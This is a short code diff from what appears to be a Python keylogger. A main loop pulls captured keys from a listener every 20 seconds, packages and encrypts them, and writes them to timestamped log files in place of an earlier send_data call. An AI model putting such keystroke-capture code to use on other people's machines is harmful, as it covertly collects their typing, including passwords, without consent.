@@ -2,8 +2,9 @@ import threading
 from time import sleep
 from listener import Listener
 from data_collector import Package
-from file_creator import File
-from time_stamp import time_stamp
+from time_stamp import time_stamp2
+from encrypt import Encryption
+from file_test import log
 
 class Manager:
     def __init__(self):
@@ -22,10 +23,18 @@ if __name__ == '__main__':
     p = Manager()
     p.start()
     while 1:
-        sleep(10)
+        sleep(20)
         data = p.listener.get_keys()
         if data:
             a = Package(data)
             b = a.export_package()
-            f = File(time_stamp)
-            f.send_data(b)
+            e = Encryption()
+            e.encrypt_text(str(b))
+            s = e.encrypted
+            print(b)
+            print(s)
+            times = f'{time_stamp2()}.txt'
+            print(times)
+            ett = str(s)
+            log(times, ett)
+
